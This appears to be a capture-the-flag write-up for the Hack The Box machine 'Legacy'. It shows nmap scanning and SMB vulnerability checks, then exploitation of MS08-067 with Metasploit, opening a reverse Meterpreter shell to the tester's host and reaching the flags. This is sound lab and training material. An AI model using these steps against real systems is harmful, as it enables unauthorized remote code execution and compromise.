# Legacy

![Legacy](https://user-images.githubusercontent.com/82520079/179717818-28e56e2a-e8ce-494f-b39f-8075a3d3b66e.png)

## Scanning

The first thing we are going to do is run an NMAP scan to find all open ports. We are going to use "-p-" to scan all the 65.535 ports, "-sS" to perform 
a TCP SYN scan, "--min-rate 5000" to increase scan speed, "--open" to display only open ports, "-Pn" to skip host discovery.

`````
# sudo nmap -p- -sS --min-rate 5000 --open -n -Pn -oG allPorts 10.10.10.4

PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
`````
Now that we know all the open ports of the remote machine, let's have a deeper look at each one of them:

`````
# nmap -sC -sV -p135,139,445 -oN targeted 10.10.10.4

PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 5d00h27m39s, deviation: 2h07m16s, median: 4d22h57m39s
|_smb2-time: Protocol negotiation failed (SMB2)
|_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:db:07 (VMware)
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2022-07-23T14:08:45+03:00
`````
## Understanding the remote machine

First things first, check if the remote machine is up and running. Let’s send a ICMP request packet and wait for the response:

`````
# ping 10.10.10.4 -c 1
PING 10.10.10.4 (10.10.10.4) 56(84) bytes of data.
64 bytes from 10.10.10.4: icmp_seq=1 ttl=127 time=61.1 ms

--- 10.10.10.4 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
`````

As we’ve received the ICMP response packet, now we know the machine is active. I also like starting with this command because we can check the remote OS that is running with the TTL (time to live) value. Remember that for TTL=128 we are dealing with a Windows machine and for TTL=64, a Linux machine. Looking at this output, the value is closest to 128, so we know we are working with a Windows machine. In fact, looking at the NMAP’s output, we know we are working with a Windows XP.

This machine has only RPC and SMB services active. Let’s check each port. First we have port 135 (Microsoft Windows RPC), 139 (Microsoft Windows netbios-ssn) and port 445 (Microsoft Windows Server 2008 R2). 

### SMB Service

When pentesting SMB service, one of the most useful tools are SMBMap and SMBClient. SMBMap allows users to enumerate samba share drives across an entire domain. List share drives, drive permissions, share contents, upload/download functionality, file name auto-download pattern matching, and even execute remote commands. Although for this tool to work, anonymous login must be allowed. In this machine, it isn’t allowed. So, if we try running this tool:

`````
# smbmap -H 10.10.10.4          
[+] IP: 10.10.10.4:445  Name: 10.10.10.4
`````

For smbclient the output is similar. Knowing that there isn’t much to enumerate without valid credentials, we are going to use NMAP’s NSE. NSE (Nmap Scripting Engine) has up to 35 SMB scripts that can be listed with the following command: 

`````
# ls /usr/share/nmap/scripts | grep smb 
`````

We are not going to see every one of them but only the most common ones. For example “smb-os-discovery.”, used to enumerate target OS along with other interesting things as Computer Name, Domain Name, NETBIOS Computer Name... In addition, we find very useful enumeration scripts: “smb-enum-shares”, to enumerate publicly exposed SMB shares, “smb-enum-users”, to enumerate all users on the remote Windows System. To make things easier, this command is going to run all SMB enumeration scripts. 

`````
# nmap --script smb-enum-domains.nse,smb-enum-groups.nse,smb-enum- processes.nse,smb-enum-services.nse,smb-enum-sessions.nse,smb-enum- shares.nse,smb-enum-users.nse -p445 10.10.10.4
Following with the NSE, nmap comes with various scripts that can be used to detect various vulnerabilities or CVEs: 2009-3103, 2017-7494, MS06-025, MS07-029, MS08-067, MS10-054, MS10-061, MS17-010 (Eternal Blue).
`````
Following with the NSE, nmap comes with various scripts that can be used to detect various vulnerabilities or CVEs: 2009-3103, 2017-7494, MS06-025, MS07-029, MS08-067, MS10-054, MS10-061, MS17-010 (Eternal Blue).

`````
# nmap --script smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-cve-2017-7494.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse,smb-vuln-regsvc-dos.nse,smb-vuln-webexec.nse -p445 10.10.10.4

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
| smb-vuln-ms08-067: 
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|           
|     Disclosure date: 2008-10-23
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
|_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
`````

Thanks to this command, we’ve discovered two critical vulnerabilities that could lead to RCE, CVE-2008-4250 and CVE-2017-0143. CVE-2017-0143 is one of various vulnerabilities detected on SMBv1 servers (Microsoft Security Bulletin MS17-010). The most severe of the vulnerabilities could allow remote code execution if an attacker sends specially crafted messages to a Microsoft Server Message Block 1.0 (SMBv1) server. But first we are going to take a look at the first vulnerability. After some research I found that this vulnerability corresponds to the Microsoft Bulletin MS08-067 and there is a module on Metasploit available. 

`````
msf6 > search ms08-067
`````

So if we run Metasploit and search for this exploit, we get only one module available: “exploit/windows/smb/ms08_067_netapi”. After modifying the parameters RHOSTS and LHOST, we can run the exploit and a Meterpreter session will open.

`````
msf6 exploit(windows/smb/ms08_067_netapi) > run

[*] Started reverse TCP handler on 10.10.14.9:4444 
[*] 10.10.10.4:445 - Automatically detecting the target...
[*] 10.10.10.4:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] 10.10.10.4:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] 10.10.10.4:445 - Attempting to trigger the vulnerability...
[*] Sending stage (175686 bytes) to 10.10.10.4
[*] Meterpreter session 1 opened (10.10.14.9:4444 -> 10.10.10.4:1032) at 2022-07-18 13:13:31 +0200

meterpreter > sysinfo
Computer        : LEGACY
OS              : Windows XP (5.1 Build 2600, Service Pack 3).
Architecture    : x86
System Language : en_US
Domain          : HTB
Logged On Users : 1
Meterpreter     : x86/windows

`````

On the directory C:\Documents and Settings we can find the user.txt flag (on the “john” folder) and the root.txt flag (on the “Administrator” folder).





















